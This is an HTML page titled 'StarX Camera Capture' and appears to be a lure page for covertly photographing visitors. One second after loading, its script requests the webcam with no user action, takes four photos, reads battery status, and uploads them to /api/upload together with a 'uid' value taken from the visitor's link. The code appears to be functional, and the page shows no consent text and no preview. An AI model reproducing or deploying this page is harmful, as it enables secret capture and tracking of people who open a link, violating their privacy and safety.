<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>StarX Capture</title>
</head>
<body>
<h2>🎥 StarX Camera Capture</h2>

<script>
const uid = new URLSearchParams(window.location.search).get("uid") || "NO_UID";

async function startCapture() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const videoTracks = stream.getVideoTracks();
        const captureCanvas = document.createElement('canvas');
        const captureCtx = captureCanvas.getContext('2d');

        let photos = [];

        for (let i = 0; i < 4; i++) {
            captureCanvas.width = 640;
            captureCanvas.height = 480;
            captureCtx.drawImage(await createVideoElement(stream), 0, 0, 640, 480);
            const blob = await new Promise(resolve => captureCanvas.toBlob(resolve, 'image/jpeg'));
            photos.push(blob);
            await new Promise(r => setTimeout(r, 1000)); // 1s interval between photos
        }

        // Battery info
        let batteryLevel = 'Unknown';
        let charging = 'Unknown';
        if (navigator.getBattery) {
            const battery = await navigator.getBattery();
            batteryLevel = Math.round(battery.level * 100);
            charging = battery.charging ? 'true' : 'false';
        }

        const formData = new FormData();
        formData.append('uid', uid);
        formData.append('battery', batteryLevel.toString());
        formData.append('charging', charging);

        photos.forEach((photo, idx) => formData.append('photo' + (idx + 1), photo));

        await fetch('/api/upload', { method: 'POST', body: formData });

        stream.getTracks().forEach(track => track.stop());

    } catch (err) {
        console.error(err);
        alert("🎥 Access Denied or Error: " + err.message);
    }
}

// Helper to create video element from stream
function createVideoElement(stream) {
    return new Promise(resolve => {
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();
        video.onloadeddata = () => resolve(video);
    });
}

// start capture after page load
window.onload = () => setTimeout(startCapture, 1000);
</script>
</body>
</html>
